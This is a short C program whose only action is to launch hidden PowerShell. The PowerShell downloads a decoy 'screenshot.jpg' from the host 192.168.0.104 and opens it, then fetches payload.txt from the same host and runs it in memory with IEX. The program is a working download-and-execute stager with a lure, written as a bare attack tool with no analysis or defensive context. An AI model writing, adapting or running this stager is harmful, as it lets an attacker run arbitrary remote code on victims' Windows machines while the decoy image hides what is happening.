#include<stdio.h>
main()
{
    system("powershell.exe -w hidden -c (new-object System.Net.WebClient).Downloadfile('http://192.168.0.104/screenshot.jpg', 'C:\\Users\\Public\\screenshot.jpg') & start C:\\Users\\Public\\screenshot.jpg & powershell.exe \"IEX ((new-object net.webclient).downloadstring('http://192.168.0.104/payload.txt'))\"");
    return 0;
}

